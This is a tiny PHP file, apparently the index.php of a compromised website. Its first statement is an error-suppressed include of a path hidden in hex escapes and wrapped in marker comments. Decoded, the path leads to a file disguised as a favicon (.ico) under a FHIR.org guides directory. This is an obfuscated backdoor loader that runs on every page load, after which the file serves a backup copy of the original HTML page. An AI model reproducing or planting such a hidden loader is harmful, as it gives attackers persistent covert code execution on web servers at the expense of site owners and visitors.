<?php
/*f1e9c*/

@include "\x2fho\x6de/\x66hi\x72/p\x75bl\x69c_\x68tm\x6c/F\x48IR\x2eor\x67/g\x75id\x65s/\x61rg\x6fna\x75t/\x66av\x69co\x6e_7\x351b\x311.\x69co";

/*f1e9c*/


echo @file_get_contents('index.html.bak.bak');